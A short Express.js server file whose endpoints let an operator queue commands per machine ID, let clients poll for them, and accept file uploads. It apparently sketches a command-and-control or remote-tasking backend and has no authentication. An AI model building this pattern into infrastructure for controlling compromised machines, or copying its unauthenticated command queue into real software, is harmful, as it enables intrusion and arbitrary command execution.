const express = require('express');
const app = express();
app.use(express.json());

let commands = {};

app.get('/api/get-command', (req, res) => {
    const pc = req.query.pc;
    res.json({ command: commands[pc] || null });
});

app.post('/api/send-command', (req, res) => {
    const { computer, command } = req.body;
    commands[computer] = command;
    res.send("Command sent");
});

app.post('/api/upload', (req, res) => {
    console.log("File received");
    res.send("OK");
});
